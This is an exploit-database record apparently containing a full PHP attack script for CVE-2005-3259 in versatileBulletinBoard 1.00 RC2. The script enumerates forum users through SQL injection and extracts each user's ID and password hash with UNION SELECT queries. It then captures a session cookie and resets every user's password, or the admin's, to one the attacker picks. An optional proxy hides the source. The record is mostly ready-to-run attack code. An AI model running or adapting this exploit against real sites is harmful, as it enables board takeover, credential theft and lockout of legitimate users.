{
  "id": "1245",
  "title": "versatileBulletinBoard 1.00 RC2 - Board Takeover (SQL Injection)",
  "cve": "CVE-2005-3259",
  "vuln_type": "sqli",
  "code": "<?php\r\n#   --- versatile_xpl.php                                    4.08 11/10/2005   #\r\n#                                                                              #\r\n#   versatileBulletinBoard 1.00 RC2 ( possibly prior versions) SQL injection / #\r\n#   board takeover                                                             #\r\n#                                                                              #\r\n#   this exploit describes the vulnerability described here:                   #\r\n#   http://rgod.altervista.org/versatile100RC2.html                            #\r\n#   with a change: with magic_quotes both on or off, you can reset admin pass  #\r\n#   (look STEP 2b...)                                                          #\r\n#                                                                              #\r\n#                                by rgod                                       #\r\n#                      site: http://rgod.altervista.org                        #\r\n#                                                                              #\r\n#   make these changes in php.ini if you have troubles                         #\r\n#   to launch this script:                                                     #\r\n#   allow_call_time_pass_reference = on                                        #\r\n#   register_globals = on                                                      #\r\n#                                                                              #\r\n#   usage: launch this script from Apache, fill requested fields, then         #\r\n#   reset any user / admin password right now!                                 #\r\n#                                                                              #\r\n#   Sun-Tzu: \"Let your rapidity be that of the wind\"                           #\r\n\r\nerror_reporting(0);\r\nini_set(\"max_execution_time\",0);\r\nini_set(\"default_socket_timeout\", 2);\r\nob_implicit_flush (1);\r\n\r\necho'<html><head><title>versatileBulletinBoard 1.00 RC2 SQL Injection/board take\r\nover</title><meta http-equiv=\"Content-Type\" content=\"text/html;charset=iso-8859-\r\n1\"><style type=\"text/css\"> body {background-color:#111111;SCROLLBAR-ARROW-COLOR:\r\n#ffffff;SCROLLBAR-BASE-COLOR: black;CURSOR: crosshair;color: #1CB081;}       img\r\n{background-color: #FFFFFF !important}input{background-color:#303030 !important}\r\noption{background-color:#303030 !important}textarea  {background-color:  #303030\r\n!important}input{color: #1CB081 !important} option   {color: #1CB081 !important}\r\ntextarea {color:#1CB081 !important}checkbox{background-color:#303030 !important}\r\nselect {font-weight: normal; color: #1CB081;  background-color:  #303030;}  body\r\n{font-size:8pt !important; background-color:#111111; body * {font-size:      8pt\r\n!important} h1 {font-size: 0.8em !important} h2 {font-size:0.8em  !important} h3\r\n{font-size: 0.8em !important}h4,h5,  h6{ font-size:  0.8em  !important} h1  font\r\n{font-size:  0.8em !important}h2 font  {font-size:  0.8em  !important} h3   font\r\n{font-size: 0.8em !important}h4 font,h5 font,h6 font{font-size:0.8em !important}\r\n* {font-style: normal !important} *{text-decoration: none !important}    a:link,\r\na:active,a:visited{text-decoration:none;color:#999900;} a:hover{text-decoration:\r\nunderline;color:#1CB081;}.Stile5{font-family:Verdana,Arial,Helvetica,sans-serif;\r\nfont-size: 10px; } .Stile6 {font-family: Verdana, Arial, Helvetica,  sans-serif;\r\nfont-weight:bold; font-style: italic;}--></style></head><body><p class=\"Stile6\">\r\nversatileBulletinBoard 1.00 RC2 (possibly prior versions) SQL injection / board\r\ntakeover </p><p class=\"Stile6\"> a  script  by rgod  at <a href=\"http://rgod.alte\r\nrvista.org\" target=\"_blank\"> http://rgod.altervista.org</a></p><table width=\"84%\r\n\">  <tr> <td  width=\"43%\">        <form  name=\"form1\"  method=\"post\"  action=\"'.\r\n$SERVER[PHP_SELF].'?path=value&host=value&port=value&proxy=value&newpass=value&t\r\nable_prefix=value\"><p><input type=\"text\" name=\"host\">      <span class=\"Stile5\">\r\nhostname (ex: www.sitename.com)</span></p><p><input  type=\"text\"    name=\"path\">\r\n<span class=\"Stile5\"> path (ex:/versatile/ or /forum/ or just /)</span></p>  <p>\r\n<input type=\"text\" name=\"port\"><span class=\"Stile5\">specify a port other than 80\r\n(default value) </span> </p> <p> <input  type=\"text\" name=\"table_prefix\"  ><span\r\nclass=\"Stile5\">usually vbb (default value) or vbb_        </span></p> <p> <input\r\ntype=\"text\" name=\"newpass\"><span class=\"Stile5\">new password for all users!   ;)\r\n</span></p><p><input type=\"text\" name=\"proxy\"><span class=\"Stile5\"> send exploit\r\nthrough an HTTP proxy (ip:port)</span></p><p><input  type=\"submit\" name=\"Submit\"\r\nvalue=\"go!\"></p></form></td></tr></table></body></html>';\r\n\r\nfunction show($headeri)\r\n{\r\n$ii=0;\r\n$ji=0;\r\n$ki=0;\r\n$ci=0;\r\necho '<table border=\"0\"><tr>';\r\nwhile ($ii <= strlen($headeri)-1)\r\n{\r\n$datai=dechex(ord($headeri[$ii]));\r\nif ($ji==16) {\r\n             $ji=0;\r\n             $ci++;\r\n             echo \"<td>&nbsp;&nbsp;</td>\";\r\n             for ($li=0; $li<=15; $li++)\r\n                      { echo \"<td>\".$headeri[$li+$ki].\"</td>\";\r\n\t\t\t    }\r\n            $ki=$ki+16;\r\n            echo \"</tr><tr>\";\r\n            }\r\nif (strlen($datai)==1) {echo \"<td>0\".$datai.\"</td>\";} else\r\n{echo \"<td>\".$datai.\"</td> \";}\r\n$ii++;\r\n$ji++;\r\n}\r\nfor ($li=1; $li<=(16 - (strlen($headeri) % 16)+1); $li++)\r\n                      { echo \"<td>&nbsp&nbsp</td>\";\r\n                       }\r\n\r\nfor ($li=$ci*16; $li<=strlen($headeri); $li++)\r\n                      { echo \"<td>\".$headeri[$li].\"</td>\";\r\n\t\t\t    }\r\necho \"</tr></table>\";\r\n}\r\n\r\n$proxy_regex = '(\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\:\\d{1,5}\\b)';\r\n\r\nfunction sendpacket($packet)\r\n{\r\nglobal $proxy, $host, $port, $html;\r\nif ($proxy=='')\r\n           {$ock=fsockopen(gethostbyname($host),$port);\r\n            if (!$ock) { echo 'No response from '.htmlentities($host).'...';\r\n\t\t\tdie;\r\n\t\t       }}\r\n\r\n             else\r\n           {\r\n\t    if (!eregi($proxy_regex,$proxy))\r\n\t    {echo htmlentities($proxy).' -> not a valid proxy...';\r\n\t     die;\r\n\t    }\r\n\t   $parts=explode(':',$proxy);\r\n\t    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';\r\n\t    $ock=fsockopen($parts[0],$parts[1]);\r\n\t    if (!$ock) { echo 'No response from proxy...';\r\n\t\t\tdie;\r\n\t\t       }\r\n\t   }\r\nfputs($ock,$packet);\r\nif ($proxy=='')\r\n  {\r\n\r\n    $html='';\r\n    while (!feof($ock))\r\n      {\r\n        $html.=fgets($ock);\r\n      }\r\n  }\r\nelse\r\n  {\r\n    $html='';\r\n    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html)))\r\n    {\r\n      $html.=fread($ock,1);\r\n    }\r\n  }\r\nfclose($ock);\r\necho nl2br(htmlentities($html));\r\n}\r\n\r\nif (($path<>'') and ($host<>'') and ($newpass<>'') and ($table_prefix<>''))\r\n{\r\n\r\nif ($port=='') {$port=80;}\r\nif ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}\r\n\r\n#STEP 1 -> List all users...\r\n$packet=\"GET \".$p.\"userlistpre.php?list='%20or%20isnull(1/0)/* HTTP/1.1\\r\\n\";\r\n$packet.=\"Accept: */*\\r\\n\";\r\n$packet.=\"Accept-Language: it\\r\\n\";\r\n$packet.=\"Accept-Encoding: gzip, deflate\\r\\n\";\r\n$packet.=\"User-Agent: HeinrichderMiragoRobot\\r\\n\";\r\n$packet.=\"Host: \".$host.\":\".$port.\"\\r\\n\";\r\n$packet.=\"Connection: close\\r\\n\\r\\n\";\r\nshow($packet);\r\nsendpacket($packet);\r\nif (!eregi(\"200 OK\",$html)) {echo '<br> Exploit failed... nothing here...'; }\r\n$magic_q=0;\r\nif (!eregi('<br>',$html)) {echo '<br>It seems we have magic_quote_gpc On here...let\\'s try to reset only admin password...';\r\n\t\t\t   $magic_q=1;\r\n\t\t\t  }\r\nif (!$magic_q)\r\n{\r\n$users=explode('<br>',$html);\r\n$temp=explode(' ',$users[0]);\r\n$users[0]=$temp[count($temp)-1];\r\n\r\nfor ($i=0; $i<=count($users)-1; $i++) //each user...\r\n{\r\n  if  (!eregi('anonymous',$users[$i]) and !eregi('deleted',$users[$i]) and !eregi(chr(0x0d),$users[$i])) // default users, eof...\r\n  {\r\n    echo '<br>'.htmlentities($users[$i]).'<br>';\r\n\r\n    #STEP 2 -> retrieve user ID for user $users($i)\r\n    $packet=\"GET \".$p.\"index.php?target=viewmesg&select='UNION%20SELECT%20ID,ID,ID,ID\";\r\n    $packet.=\",ID,ID,ID,ID,ID,ID,ID,ID,ID,ID,ID,ID,ID,ID,ID,ID,ID%20FROM%20\".$table_prefix;\r\n    $packet.=\"_user%20where%20name='\".$users[$i].\"'/* HTTP/1.1\\r\\n\";\r\n    $packet.=\"Accept: */*\\r\\n\";\r\n    $packet.=\"Accept-Language: it\\r\\n\";\r\n    $packet.=\"Accept-Encoding: gzip, deflate\\r\\n\";\r\n    $packet.=\"User-Agent: FFC Trap Door Spider\\r\\n\";\r\n    $packet.=\"Host: \".$host.\":\".$port.\"\\r\\n\";\r\n    $packet.=\"Connection: close\\r\\n\\r\\n\";\r\n    show($packet);\r\n    sendpacket($packet);\r\n\r\n    $temp=explode(\"subject: \",$html);\r\n    $temp2=explode(\"<\",$temp[1]);\r\n    $uid=$temp2[0];\r\n    echo \"<br> UID -> \".htmlentities($uid);\r\n\r\n    #STEP 3 -> retrieve MD5 password hash for user $users($i)\r\n    $packet=\"GET \".$p.\"index.php?target=viewmesg&select='UNION%20SELECT%20pass,pass,pass,pass\";\r\n    $packet.=\",pass,pass,pass,pass,pass,pass,pass,pass,pass,pass,pass,pass,pass,pass,pass,pass\";\r\n    $packet.=\",pass%20FROM%20\".$table_prefix.\"_user%20where%20name='\".$users[$i].\"'/* HTTP/1.1\\r\\n\";\r\n    $packet.=\"Accept: */*\\r\\n\";\r\n    $packet.=\"Accept-Language: it\\r\\n\";\r\n    $packet.=\"Accept-Encoding: gzip, deflate\\r\\n\";\r\n    $packet.=\"User-Agent: Irvine/1.x.x\\r\\n\";\r\n    $packet.=\"Host: \".$host.\":\".$port.\"\\r\\n\";\r\n    $packet.=\"Connection: close\\r\\n\\r\\n\";\r\n    show($packet);\r\n    sendpacket($packet);\r\n\r\n    $temp=explode(\"subject: \",$html);\r\n    $temp2=explode(\"<\",$temp[1]);\r\n    $hash=$temp2[0];\r\n    echo \"<br> hash -> \".htmlentities($hash);\r\n\r\n    #STEP 4 -> go to reset password panel and retrieve a session cookie\r\n    $packet=\"GET \".$p.\"index.php?target=setpass&u=\".$uid.\"&ph=\".$hash.\" HTTP/1.1\\r\\n\";\r\n    $packet.=\"User-Agent: libwww-perl/5.53\\r\\n\";\r\n    $packet.=\"Host: \".$host.\":\".$port.\"\\r\\n\";\r\n    $packet.=\"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\\r\\n\";\r\n    $packet.=\"Accept-Language: en\\r\\n\";\r\n    $packet.=\"Accept-Charset: windows-1252, utf-8, utf-16, iso-8859-1;q=0.6, *;q=0.1\\r\\n\";\r\n    $packet.=\"Accept-Encoding: deflate, gzip, x-gzip, identity, *;q=0\\r\\n\";\r\n    $packet.=\"Connection: close, TE\\r\\n\";\r\n    $packet.=\"TE: deflate, gzip, chunked, identity, trailers\\r\\n\\r\\n\";\r\n    show($packet);\r\n    sendpacket($packet);\r\n    $temp=explode(\"Set-Cookie: \",$html);\r\n    $temp2=explode(' ',$temp[1]);\r\n    $cookie=$temp2[0].\"path=/\";\r\n    echo'<br>cookie: -> '.htmlentities($cookie).'<br><br>';\r\n\r\n\r\n    #STEP 5 -> reset the passoword to $newpass...\r\n    $newpass=urlencode($newpass);\r\n    $data=\"send=true&uid=\".$uid.\"&newpass=\".$newpass;\r\n    $packet=\"POST \".$p.\"index.php?target=setpass HTTP/1.1\\r\\n\";\r\n    $packet.=\"User-Agent: W3C_Validator/1.xxx libwww-perl/5.xx\\r\\n\";\r\n    $packet.=\"Host: \".$host.\":\".$port.\"\\r\\n\";\r\n    $packet.=\"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\";\r\n    $packet.=\"Accept-Language: en\\r\\n\";\r\n    $packet.=\"Accept-Charset: windows-1252, utf-8, utf-16, iso-8859-1;q=0.6, *;q=0.1\\r\\n\";\r\n    $packet.=\"Accept-Encoding: deflate, gzip, x-gzip, identity, *;q=0\\r\\n\";\r\n    $packet.=\"Referer: http://\".$host.\":\".$port.$path.\"index.php?target=setpass&u=\".$uid.\"&ph=\".$hash.\"\\r\\n\";\r\n    $packet.=\"Cookie: \".$cookie.\"\\r\\n\";\r\n    $packet.=\"Cookie2: \\$Version=1\\r\\n\";\r\n    $packet.=\"Connection: close, TE\\r\\n\";\r\n    $packet.=\"TE: deflate, gzip, chunked, identity, trailers\\r\\n\";\r\n    $packet.=\"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n    $packet.=\"Content-Length: \".strlen($data).\"\\r\\n\\r\\n\";\r\n    $packet.=$data;\r\n    show($packet);\r\n    sendpacket($packet);\r\n    if (eregi(\"password changed\",$html))\r\n                       {echo \"<br>Exploit successful...login with username: \".htmlentities($users[$i]).\" and password: \".htmlentities($newpass).\"<br>\";\r\n                        echo \"<br> Remember to reset your cookies...<br>\";}\r\n                    else\r\n                       {echo \"<br> Exploit failed, something goes wrong or maybe you're Britney Spears ...\";}\r\n}}}\r\nelse\r\n{\r\n    #STEP 2b -> reset only admin passoword to $newpass...\r\n    $newpass=urlencode($newpass);\r\n    $data=\"send=true&uid=11&newpass=\".$newpass;\r\n    $packet=\"POST \".$p.\"index.php?target=setpass HTTP/1.1\\r\\n\";\r\n    $packet.=\"User-Agent: W3C_Validator/1.xxx libwww-perl/5.xx\\r\\n\";\r\n    $packet.=\"Host: \".$host.\":\".$port.\"\\r\\n\";\r\n    $packet.=\"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\";\r\n    $packet.=\"Accept-Language: en\\r\\n\";\r\n    $packet.=\"Accept-Charset: windows-1252, utf-8, utf-16, iso-8859-1;q=0.6, *;q=0.1\\r\\n\";\r\n    $packet.=\"Accept-Encoding: deflate, gzip, x-gzip, identity, *;q=0\\r\\n\";\r\n    $packet.=\"Referer: http://\".$host.\":\".$port.$path.\"index.php?target=setpass&u=11&ph=\\r\\n\";\r\n    $packet.=\"Cookie2: \\$Version=1\\r\\n\";\r\n    $packet.=\"Connection: close, TE\\r\\n\";\r\n    $packet.=\"TE: deflate, gzip, chunked, identity, trailers\\r\\n\";\r\n    $packet.=\"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n    $packet.=\"Content-Length: \".strlen($data).\"\\r\\n\\r\\n\";\r\n    $packet.=$data;\r\n    show($packet);\r\n    sendpacket($packet);\r\n    if (eregi(\"password changed\",$html))\r\n                       {echo \"<br>Exploit successful...look for admin username and login with password: \".htmlentities($newpass).\"<br>\";\r\n                       }\r\n                    else\r\n                       {echo \"<br> Exploit failed, something goes wrong or maybe you're Britney Spears ...\";}\r\n}\r\n}\r\nelse\r\n{echo '<br>Fill in requested fields, optionally specify a proxy...';}\r\n\r\n?>\r\n\r\n# milw0rm.com [2005-10-10]",
  "url": "https://www.exploit-db.com/exploits/1245"
}